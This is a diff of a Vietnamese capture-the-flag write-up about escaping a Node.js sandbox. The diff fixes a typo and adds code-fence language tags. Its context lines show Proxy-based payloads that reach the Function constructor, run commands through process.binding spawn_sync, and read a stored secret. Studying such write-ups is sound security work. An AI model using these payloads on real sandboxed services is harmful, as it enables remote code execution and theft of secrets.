@@ -53,7 +53,7 @@ Nhìn lại code của đề:
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc)
 
-Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ đông import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
+Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ động import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
 ```js
 1});(() => { throw new Proxy({}, {
   get: function(me, key) {
@@ -574,7 +574,7 @@ node --stack-size=10000000 test.js
 
 Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default stack-size. Đến đây thì mình bí rồi, mình xem thử cách làm của author
 
-```
+```js
 (()=>{const a=new Error;a.name={toString:new Proxy(()=>{},{apply(a,b,c){throw c.constructor.constructor("String.prototype.startsWith = (s, p) => { return false; };return [...secureRequire('util').inspect(globalThis.storage, {customInspect: true, depth: Infinity})]")()}})};try{a.stack}catch(a){return a}})();
 ```
 
@@ -583,7 +583,7 @@ Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default 
 UPDATE: thật ra đây là vấn đề của thằng burpsuite cơ, payload mình oke =))) đm burpsuite, me go for postman
 
 ### Unintendeds
-```
+```js
 (function(){return ({ toJSON: function() {k = arguments.callee.caller.constructor(`globalThis.storage.__defineGetter__('p', function(){ return this.secret });return btoa(globalThis.storage.p);`)()}, toString: () => k })})()
 ```
 
@@ -591,7 +591,7 @@ Vì getter sẽ được invoke sau khi Proxy handle xong, nếu thời điểm 
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7fb75684-b37b-4afd-ae41-f94c778d3543)
 
-```
+```js
 new Proxy(_=>_ , {
     get: new Proxy(_=>_ , {
       apply: function(target, thisArg, argumentsList) {
